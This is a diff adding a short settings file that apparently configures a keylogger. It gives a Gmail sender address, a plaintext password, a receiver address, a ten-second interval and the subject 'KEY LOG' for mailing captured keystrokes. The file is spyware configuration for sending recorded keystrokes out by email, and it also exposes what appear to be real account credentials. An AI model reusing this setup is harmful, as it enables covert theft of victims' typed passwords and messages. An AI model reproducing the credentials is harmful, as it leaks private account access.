@@ -1,0 +1,6 @@
+SETTINGS_EMAIL$-> jaylord.abueva98@gmail.com
+SETTINGS_Pw$-> abuevajaylord98
+SETTINGS_RECEIVER$-> jaylord.abueva98@gmail.com
+INTERVAL$-> 10000
+SUBJECT$-> KEY LOG
+NOTE: 1000 for 1 seconds
